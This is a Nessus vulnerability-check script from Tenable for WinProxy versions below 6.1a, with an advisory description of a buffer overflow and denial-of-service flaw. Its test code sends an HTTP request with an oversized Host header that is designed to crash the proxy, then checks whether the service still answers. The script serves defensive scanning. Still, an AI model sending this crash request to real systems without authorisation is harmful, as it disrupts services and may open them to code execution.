#
# (C) Tenable Network Security
#


if (description) {
  script_id(20391);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-3187", "CVE-2005-4085");
  script_bugtraq_id(16147, 16148);

  script_name(english:"WinProxy < 6.1a HTTP Proxy Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in WinProxy < 6.1a HTTP Proxy");

  desc = "
Synopsis :

The remote web proxy server is affected by denial of service and
buffer overflow vulnerabilities. 

Description :

The remote host is running WinProxy, a proxy server for Windows. 

The installed version of WinProxy's HTTP proxy fails to handle long
requests as well as requests with long Host headers.  An attacker may
be able to exploit these issues to crash the proxy or even execute
arbitrary code on the affected host. 

See also :

http://www.idefense.com/intelligence/vulnerabilities/display.php?id=363
http://www.idefense.com/intelligence/vulnerabilities/display.php?id=364
http://www.winproxy.com/products/relnotes.asp

Solution : 

Upgrade to WinProxy version 6.1a or later. 

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_DENIAL);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("find_service2.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Make sure it looks like WinProxy.
help = get_kb_item("FindService/tcp/"+port+"/help");
if (help && "Proxy-agent: BlueCoat-WinProxy" >< help) {
  # Flag it as a proxy.
  register_service(port:port, ipproto:"tcp", proto:"http_proxy");

  # Try to exploit it.
  soc = http_open_socket(port);
  if (soc) {
    req = string(
      "GET http://127.0.0.1/ HTTP/1.0\r\n",
      "Host: ", crap(32800), "\r\n",
      "\r\n"
    );
    send(socket:soc, data:req);
    res = http_recv(socket:soc);
    http_close_socket(soc);
  }

  # If we didn't get anything, try resending the query.
  if (strlen(req) && !strlen(res)) {
    soc = http_open_socket(port);
    if (soc) {
      req = http_get(item:"/", port:port);
      send(socket:soc, data:req);
      res2 = http_recv(socket:soc);
      http_close_socket(soc);
    }

    # There's a problem if we didn't get a response the second time.
    if (!strlen(res2)) {
      security_warning(port);
      exit(0);
    }
  }
}
